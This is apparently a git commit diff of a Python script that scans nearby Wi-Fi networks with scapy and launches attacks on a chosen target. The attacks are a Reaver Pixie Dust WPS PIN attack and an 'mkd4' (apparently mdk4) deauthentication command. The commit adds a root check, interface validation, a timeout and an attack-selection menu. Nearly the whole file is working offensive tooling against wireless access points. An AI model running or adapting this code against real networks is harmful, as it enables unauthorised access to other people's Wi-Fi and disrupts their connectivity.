1192fefe2f20cf8793b3f81a359e7c07386ee9e2
Alex <95647169+root616C6578@users.noreply.github.com>
2025-06-18 12:54:44 +0300

    add

--- main.py
+++ main.py
@@ -1,6 +1,4 @@
-# -*- coding: utf-8 -*-
-# Script to scan Wi-Fi networks and run Pixie Dust attack using Reaver
-'''
+''''
 MIT License
 
 Copyright (c) 2025 Alex
@@ -23,15 +21,43 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 '''
+
 from scapy.all import sniff, Dot11, Dot11Elt
 import subprocess
+import shlex
+import time
+import os
 
-interface = input("Enter the interface to use (e.g., wlan0): ")
+while True:
+    try:
+        # Check if the script is run with root priviileges
+        if os.geteuid() != 0:
+            print("This script must be run as root. Please use 'sudo'.")
+            exit(1)
+        break
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        exit(1)
+    
+while True:
+    interface = input("Enter the interface name: ")
+    # Check if the interface exists
+    if os.path.exists(f"/sys/class/net/{interface}"):
+        break
+    else:
+        print(f"Interface '{interface}' does not exist. Please enter a valid interface name.")
+
+
+
+#Commands
+ifdown = f"sudo ifconfig {interface} down"
+iwconfig = f"sudo iwconfig {interface} mode monitor"
+ifup = f"sudo ifconfig {interface} up"
 
 # Enable monitor mode
-subprocess.call(f"sudo ifconfig {interface} down", shell=True)
-subprocess.call(f"sudo iwconfig {interface} mode monitor", shell=True)
-subprocess.call(f"sudo ifconfig {interface} up", shell=True)
+subprocess.call(shlex.split(ifdown))
+subprocess.call(shlex.split(iwconfig))
+subprocess.call(shlex.split(ifup))
 
 networks = []
 
@@ -39,7 +65,10 @@ def get_channel(pkt):
     elt = pkt.getlayer(Dot11Elt)
     while elt:
         if elt.ID == 3:
-            return ord(elt.info)
+            #return ord(elt.info)
+            if elt.info and len(elt.info) >= 1:
+                return elt.info[0]
+
         elt = elt.payload.getlayer(Dot11Elt)
     return None
 
@@ -76,8 +105,17 @@ command_pixie_dust = f"reaver -i {interface} -b {target['BSSID']} -c {target['Ch
 def run_pixie_dust():
     try:
         print("\nRunning Pixie Dust attack...")
-        process = subprocess.Popen(command_pixie_dust, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
+        args = shlex.split(f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv")
+
+        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        try:
+            stdout, stderr = process.communicate(timeout=120)
+        except subprocess.TimeoutExpired:
+            process.kill()
+            stdout, stderr = process.communicate()
+            print("Pixie Dust attack stopped after 120 seconds timeout.")
+            return  # Вийти , не обробляючи як успішне завершення
 
         if process.returncode == 0:
             print("Pixie Dust attack completed successfully.")
@@ -88,4 +126,33 @@ def run_pixie_dust():
     except Exception as e:
         print(f"An error occurred: {e}")
 
-run_pixie_dust()
+
+def run_mkd4():
+    try:
+        print("\nRunning mkd4 attack...")
+        # Assuming mkd4 is a command that needs to be run with specific parameters
+
+        subprocess.call(shlex.split(f"mkd4 d -c {target['Channel']} -b {target['BSSID']} -i {interface}"))
+        print("mkd4 command executed (placeholder).")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+while True:
+    try:
+        print("\nChoose an attack method:")
+        print("1. Pixie Dust")
+        print("2. mkd4")
+        print("3. Exit")
+        option = input("Choose attack method: ")
+
+        if option == '1':
+            run_pixie_dust()
+        elif option == '2':
+            run_mkd4()
+        elif option == '3':
+            print("Exiting.")
+            break
+        else:
+            print("Invalid option.")
+    except KeyboardInterrupt:
+        print("\nExiting...")
+        break
